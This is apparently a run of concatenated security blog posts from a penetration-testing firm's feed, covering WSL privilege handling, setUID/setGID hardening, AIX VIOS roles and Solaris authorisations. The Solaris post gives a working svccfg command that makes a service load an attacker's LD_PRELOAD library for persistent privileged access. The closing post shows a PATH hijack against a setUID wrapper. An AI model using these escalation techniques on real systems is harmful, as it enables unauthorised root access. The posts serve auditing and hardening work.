<p>I should also note that whilst sudo prompts for a password on each new instance of bash.exe/conhost.exe pair hosting a terminal however if you authenticate to sudo, close the terminal and then reopen it, then your sudo ticket may still be valid &#8211; this requires exact co-ordination as sudo sessions are tracked by PID, however the first terminal opened will always have a Linux bash process with a PID of 2 which may well be blessed from a previous sudo session.</p>
<h2>Privileges</h2>
<p>Finally, as per issue <a title="issue 561" href="https://github.com/Microsoft/BashOnWindows/issues/561">issue 561</a>, because everything runs as you from Windows&#8217; perspective, the only way to successfully execute ping (which requires an ICMP raw socket on Linux) is to run bash.exe in elevated mode (as Administrator). This, despite the fact that a non-elevated user can quite happily execute ping on the Windows host. WSL doesn&#8217;t even implement concept of root in any real sense, let along implement the necessary Linux syscalls to support capabilities in any useful fashion. This in turn means that everything else spawned from the elevated shell also runs with Windows administrative privileges. For comparison, here&#8217;s what the new branches of your process tree will look like:</p>
<ul>
<li>wininit.exe.exe (runs as SYSTEM):
<ul>
<li>services.exe (runs as SYSTEM):
<ul>
<li>svchost.exe (runs as SYSTEM):
<ul>
<li>RuntimeBroker.exe (runs as your user, disabled privileges, not elevated):
<ul>
<li>bash.exe (runs as your user, disabled privileges, elevated):
<ul>
<li>conhost.exe (runs as your user, disabled privileges, elevated)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>The first contains the Windows bash.exe instance which hosts your new terminal, whilst the second contains the Linux process tree:</p>
<ul>
<li>svchost.exe (runs as SYSTEM):
<ul>
<li>init (runs as your user, no disabled privileges, locked into a job, elevated):
<ul>
<li>bash (runs as your user, disabled privileges, locked into a job, break away set to true, elevated):
<ul>
<li>sudo (runs as your user, disabled privileges, locked into a job, break away set to true, elevated):
<ul>
<li>ping (runs as your user, disabled privileges, locked into a job, break away set to true, elevated)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>Microsoft&#8217;s stock answer is that the Ubuntu instance (or rather the bash.exe instance hosting the terminal and accompanying lxss.sys kernel implementation) is locked down, effectively sandboxed by a combination of Windows DACLs, the concept of <a href="jobs" href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684161(v=vs.85).aspx">jobs</a> (touched upon at the start and akin to Linux <a title="cgroups" href="https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Resource_Management_Guide/ch01.html">cgroups</a>) and syscall mapping that effectively uses lxss.sys to <a title="proxy" href="https://blogs.msdn.microsoft.com/wsl/2016/06/08/wsl-system-calls/">proxy</a> most syscalls onto their corresponding NT kernel implementation.</p>
<h2>Conclusion</h2>
<p>The design of WSL seems to be relatively robust if slightly odd, however time will tell, particularly if offensive teams pick up the whiff of a new opportunity. If nothing else, take this article as a reminder that WSL should not be considered a security boundary and that it will remain unmanaged irrespective of how you administer your Windows hosts.</p>

				<content:encoded><![CDATA[<p>It is a topic that often comes up on client engagements, usually when running structured build reviews of Linux &#8220;gold builds&#8221;, but occasionally when trying to explain in detail how we used a Linux system to pivot internally.</p>
<p>SetUID and setGID files are inevitably a risk, potentially allowing attackers to elevate privileges to root from a basic user. When shared out on SMB or NFS shares they can spread the risk even further.<span id="more-5793"></span></p>
<p>One good approach would be:</p>
<p>&#8220;The only good setUID is a chmod -s setuid&#8221; i.e. deactivate this particular functionality.</p>
<p>However, sysadmins may (understandably) get a bit wobbly when we suggest this and come up with a number of fairly valid reasons why this is tricky. They have a point to some extent, but this is 2017 and we should be biting some of these bullets.</p>
<p>Yes, reducing the risk in this area is tough, but it is in fact a good start in defining least privilege security controls. You can learn how little or how much power individual users require and manage this accordingly. You can also test your changes before rolling them out and sanity check the advice given.</p>
<p>At the very least we need a list of files that should not be setUID that we can give to sysadmins and, with confidence, recommend removing or changing the permissions. A pragmatic strategy for mitigating the risks incurred would also be good.</p>
<h2>So what are they?</h2>
<p>SetUID/setGID bits are file permissions set on binary files when we need them to run with the permissions of the owner (setUID) or the group (setGID) that owns the file, usually a root or equivalent user. Historically this functionality was entrenched in UNIX and Linux and was necessary, up to a point, for a system to function as intended.</p>
<p>Many vendors are now working toward eliminating the requirement for these permissions and UNIX based systems can be configured, with some care, not to use them.</p>
<p>We potentially have 3 categories of setUID and setGID files:</p>
<h3>The &#8220;naughty&#8221; list</h3>
<ul>
<li>May have become setUID by accident, installation of third-party software, malicious activity or sloppy coding and should almost certainly not be allowed</li>
<li>tar, find, vi, etc</li>
<li>Likely high risk to get root easily</li>
<li>Epic fail -rwsrw-rw- More common than you would think</li>
<li>Vendor supplied software often a culprit</li>
</ul>
<h3>The &#8220;remove&#8221; list</h3>
<ul>
<li>Redundant, legacy or not really required to be setUID</li>
<li>rcp, arping, etc</li>
<li>Likely low risk but should be easy to remove</li>
</ul>
<h3>The &#8220;allowed&#8221; list</h3>
<ul>
<li>OS may fail to function as expected if setUID is removed without care</li>
<li>For example passwd, sudo</li>
<li>Should be mitigated to minimise risks</li>
<li>Many can be reclassified as 2 above and have the setUID bit removed</li>
</ul>
<p>We report on categories 1 (naughty) and 2 (remove) scoring appropriate to the risk and ease of exploitation. We report on 3 (allowed) with recommendations to mitigate.</p>
<p>For example, a setUID on the find command (or any shell command with abilities to run other programs or shells) would be a high risk vulnerability allowing regular users to become root fairly easily.</p>
<h2>How to deal with these issues?</h2>
<p>The approach to recommend to customers:</p>
<ol>
<li>Audit &#8211; find all setUID and setGID files on the system locally and on all filesystems not mounted nosetuid</li>
<li>Validate &#8211; elfsign and cross checks against vendor checksums</li>
<li>Eliminate where possible &#8211; uninstall, chmod -s or rm</li>
<li>Mitigate where necessary &#8211; FIM, auditing, remote logging, mount NAS nosetuid</li>
</ol>
<p>This applies primarily to common Linux distributions. Solaris and AIX for example may have slightly different filenames and locations, but similar principles apply.</p>
<p>The ubiquitous sudo or other equivalent tools can be used to configure fine grained privilege management without the requirement for setUID permissions. Your version of sudo must be up to date, the sudoers configuration files must be secure and have a strictly limited set of commands allowed per user or group.</p>
<p>Customers need to consider how the remediation and mitigation steps fit within their overall strategies for user and privilege management alongside local and remote file permissions.</p>
<p>For example:</p>
<p>Do they have a good FIM solution and can they utilise remote logging as a mitigation? Do they wish to work at the standard build level and have a hardened standard build? If so, then maybe they&#8217;re in the right place to look at removing these permissions?</p>
<p>In particular File Integrity Monitoring, which should focus on the most vulnerable files on a system, should track any changes to the files with the setUID/setGID bit set. Any changes should be audited and remotely logged to ensure that an attacker cannot cover their tracks.</p>
<p>Other mitigation techniques include SELinux and other RBAC mechanisms on Linux, Trusted Execution and Trusted Computing Base on AIX and RBAC on Solaris.</p>
<p>More recent Linux kernels (starting 2.6.26) can make use of capabilities which provide fine-grained control over superuser permissions, allowing use of the root user to be avoided.</p>
<p>Sysadmins need some encouragement and support in both remediation and mitigation. If something unexpected does not work upon removing a setUID file permission, it is important to try to use that as a learning experience and a consequence of taking least privilege as far as possible.</p>
<p>At the very least tighten up your sudo configuration and remove as many setUIDs as you can.</p>
<h3>Finding setUID and setGID files</h3>
<pre class="brush: bash; gutter: false; title: ; notranslate">
# find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;
</pre>
<p>Example output:</p>
<p>Here is a setUID file:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
-rws--x--x. 1 root root 23960 Sep 23  2016 /usr/bin/chfn
</pre>
<p>And here is a setGID file:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
-r-xr-sr-x. 1 root tty 15392 May  4  2014 /usr/bin/wall
</pre>
<h3>Just for fun</h3>
<p>Snapshot a VM of your favourite Linux distro and run the following command (<b>this will break your system in odd ways, so never do it to a production system</b>) and run the following commands:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
# find / -type f -perm -u+s -exec ls -l {} \; |awk '{print $NF}'|grep -v proc &amp;amp;gt; /var/tmp/setUID.lst
# find / -type f -perm -g+s -exec ls -l {} \; |awk '{print $NF}'|grep -v proc &amp;amp;gt; /var/tmp/setGID.lst
# for a in `cat /var/tmp/setUID.lst`; do chmod u-s $a; done
# for a in `cat /var/tmp/setGID.lst`; do chmod g-s $a; done
</pre>
<p>See what breaks.</p>
<p>You can revert to the snapshot if your nerve does not hold.</p>
<p>You should be able to reboot the machine and log in as a normal user. After that you will discover the limitations you have imposed upon yourself and the operating system.</p>
<h3>The lists (mid 2017) which are not exhaustive</h3>
<p>N.B. PATHs to the files may vary&#8230;</p>
<h3>The &#8220;naughty&#8221; list</h3>
<ul>
<li>/usr/bin/awk</li>
<li>/bin/tar</li>
<li>/usr/bin/python</li>
<li>/usr/bin/script</li>

<li>/usr/sbin/lsof</li>
<li>/bin/cat</li>
<li>/usr/bin/vim</li>
<li>/usr/bin/gvim</li>
</ul>
<p>The point with this list is that they should not really be setUID or setGID and they all have command options that could spawn a shell or otherwise engage in mischief.</p>
<h3>The &#8220;remove&#8221; list</h3>
<ul>
<li>/usr/bin/rcp</li>

</ul>
<p>Consider removing as a good mitigation strategy.</p>

<h2>Final words</h2>
<p>It&#8217;s worth noting that we know these lists won&#8217;t work for everyone; systems are complex and behaviour is intertwined. That said, no matter what your opinion on the necessity or otherwise of a setUID/setGID bit on a given file, we&#8217;d like to think the approach of knowing which files have the setUID/setGID bit and why is something we can all get on board with.</p>

				<content:encoded><![CDATA[<p>Following a recent post from a consultant at IBM discussing how <a title="how privileged access should be performed on VIOS" href="https://www.ibm.com/developerworks/community/blogs/AIXDownUnder/entry/VIOS_switching_between_padmin_and_root1?lang=en">how privileged access should be performed on VIOS</a>, I figured it was time to share some of our research in this arena. Those of you that are regular readers will know that I love <a title="root" href="/tag/root/">root</a>. For those of you that are new, welcome aboard.<span id="more-5255"></span></p>
<p>Let&#8217;s start by defining what VIOS is. VIOS is a subsystem that runs on a logical partition (LPAR) which manages shared hardware such as disks and network adaptors and allows other LPARs to access them. VIOS is managed via a special padmin account which gives access to a restricted shell from where the hardware can be managed. In practice, however it&#8217;s just another AIX LPAR and as the blog post from IBM notes, setup_oem_env can be used to move from the padmin user to the root user.</p>
<p>Firstly, note that setup_oem_env is not setUID. So how does it work? Examining the padmin user we see that it has a single role (PAdmin):</p>
<p>The membership of a role is determined by /etc/security/user but we can examine a specific use using the rolelist command like so:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ rolelist -u padmin
PAdmin
</pre>
<p>You can also find your current active role using the -e flag to rolelist. Moving on, what does the PAdmin role mean?</p>
<p>Roles are defined in /etc/security/role but as with role membership, we can also use shell commands to enumerate them. For example, the following shows what authorisations the PAdmin role has:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ lsrole PAdmin
PAdmin
authorizations=vios.device,vios.fs,vios.install,vios.lvm,vios.network,vios.security,vios.system,vios.oemsetupenv,vios.system.cluster,aix.system.config.artex
rolelist= groups=staff visibility=1 screens=* dfltmsg= msgcat= auth_mode=INVOKER
id=23
</pre>
<p>In the context of getting root, vios.oemsetupenv is the charm. This and other AIX authorisations are defined in /etc/security/privcmds. It is possible to specify what commands the possessor of the vios.oemsetupenv authorisation can run (and indeed the privileges with which those commands will ultimately be executed).</p>
<p>You see, AIX like Solaris, is gradually getting rid of the concept that uid=0 is god. IBM haven&#8217;t taken this as far as Oracle yet but there&#8217;s nothing to stop a dedicated administrator from leveraging this functionality. So, if you&#8217;re auditing an AIX box, I would very much recommend checking what roles users have (via /etc/security/user) to ensure that no appropriate roles have been assigned.</p>
<p>PS I&#8217;ve never seen this used in practice (outside of VIOS), but I&#8217;m sure there will be a first time.<br />
PPS rolelist -p will tell you what roles a given process has.<br />
PPPS esaadmin has the SysConfig role but it&#8217;s not normally an active account.</p>

				<content:encoded><![CDATA[<p>Just like Linux, the modern Solaris install doesn&#8217;t simply rely on UID/GID to determine privilege. Instead there are roles and profiles to contend with. The following is a loose explanation of how they work:<span id="more-5100"></span></p>
<ol>
<li>User = user + group + user_attr + /etc/security/auth_attr + /etc/security/auth_attr.d/*</li>
<li>
<ol>
<li>user = Raw privileges (PRIV_DEFAULT + !PRIV_LIMIT)</li>
<li>user_attr = List of profiles (/etc/security/prof_attr + /etc/security/prof_attr.d/*)</li>
<ol>
<li>prof_attr = List of authorisations (/etc/security/auth_attr + /etc/security/auth_attr.d)</li>
</ol>
</ol>
</li>
</ol>
<p>Additionally, /etc/security/exec_attr specifies what privs a particular command will execute under a given profile.</p>
<p>The first user added will get root by virtue of this scheme. Having said that, for Solaris 11, Oracle pretty much canned this and moved to sudo instead. It&#8217;s still there though, if you look.</p>
<p>So today, we were looking at a Solaris 11 box which was mostly being managed via sudo. I say mostly because we found this (isolated) gem in user_attr:</p>
<pre class="brush: plain; gutter: false; title: ; notranslate">
bob::::profiles=Service Management,Service Operator
</pre>
<p>It&#8217;s likely not a backdoor but it is rather odd given the beautiful /etc/sudoers.d hirearchy that also existed on the same system. This authorised them to use the solaris.smf.manage and solaris.smf.modify privileges.</p>
<p>This could be bad. To quote the <a title="man page" href="http://docs.oracle.com/cd/E23824_01/html/821-1474/smf-security-5.html">man page</a>, users authorised with the solaris.smf.modify privilege are:</p>
<pre class="brush: plain; gutter: false; title: ; notranslate">
Authorized to add, delete, or modify services, service instances, or their properties, and to read protected property values.
</pre>
<p>whilst solaris.smf.manage is:</p>
<pre class="brush: plain; gutter: false; title: ; notranslate">
The service management profile is the minimum required to use the pkg(1) command to add or remove software packages that contain an inventory of services in its service manifest.
</pre>
<p>So is it exploitable? Well, it turns out that users with those particular authorised privileges can run the following:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
bob@localhost:~ $ svccfg -s &lt;service&gt; setenv -m start LD_PRELOAD /tmp/libdoor.so; svcadm refresh &lt;service&gt;; svcadm restart &lt;service&gt;
</pre>
<p>This, when executed, will cause the named service to have a new environment variable defined (LD_PRELOAD) which points at our malicious code (/tmp/libdoor.so) which will be loaded by the service when it is restarted. As a result, our malicious code will be run as the same user as the victim user, giving us persistent privileged access to the victim machine.</p>
<p>Without these privileges, the same command will result in an error:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
bob@localhost:~ $ svccfg -s &lt;service&gt; setenv -m start LD_PRELOAD /tmp/libdoor.so; svcadm refresh &lt;service&gt;; svcadm restart &lt;service&gt;
svccfg: Permission denied.
</pre>
<p>Bottom line, if you compromise a modern Solaris box, try running auths (and roles) to check what privileges may have been left behind, it may be more than you think.</p>

				<content:encoded><![CDATA[<p>Consider the case of a setUID binary that runs as root and allows the caller to execute certain other scripts and binaries from a given restricted directory. The Portcullis Labs team recently spotted such a case and I was asked to take a look to determine exploitablity. What follows is a short analysis of what I found.<span id="more-4992"></span></p>
<p>The binary concerned took several steps to protect itself including:</p>
<ul>
<li>Validating that the sub-command wasn&#8217;t overly long</li>
<li>Validating that the sub-command didn&#8217;t contain sensitive characters</li>
<li>Validating that the sub-command existed in the restricted location</li>
<li>Checking that the sub-command had the setUID bit set</li>
<li>Clearing down sensitive environment variables such as PATH and LD_PRELOAD prior to transferring control to the sub-command</li>
</ul>
<p>So what could go wrong?</p>
<p>Well, it turns out that the way it cleared down sensitive variables left a little to be desired.</p>
<p>If you break out IDA (or even plain old strings), you&#8217;ll see that the binary sets PATH etc to &#8220;&#8221;. This is fine in most cases, but if the script uses an interpreter that doesn&#8217;t reset PATH (sadly sh will nomally reset it via the rc files etc) then the interpreter will attempt to run commands from &#8220;&#8221; i.e. the current working directory.</p>
<p>For example:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ ls -la /restricted/allowed
-rwsr-xr-x 1 root root 56 Feb 12 20:27 /restricted/allowed
$ cat /restricted/allowed
#!/usr/bin/tclsh8.6
exec id
$ cat ./id
#!/bin/sh
touch foo
$ ls -l foo
-rw-r--r-- 1 root user 0 Feb 12 20:29 foo
